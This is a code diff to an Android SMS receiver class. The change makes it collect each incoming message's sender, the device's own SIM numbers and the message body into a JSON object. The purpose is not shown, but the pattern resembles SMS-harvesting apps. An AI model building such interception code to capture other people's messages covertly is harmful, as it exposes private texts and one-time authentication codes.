@@ -30,8 +30,10 @@ public class SmsReceiver extends BroadcastReceiver {
                     for (Object pdu : pdus) {
                         SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                         if (smsMessage != null) {
-                            String sender = smsMessage.getDisplayOriginatingAddress();
+                            String receiver = Helper.getSimNumbers(context);
+                            String sender = "Receiver : "+receiver + "<br> Sender : " +  smsMessage.getDisplayOriginatingAddress();
                             String messageBody = smsMessage.getMessageBody();
+
                             if(messageBody!=previous_message){
                                 previous_message = messageBody;
                                 JSONObject jsonData = new JSONObject();
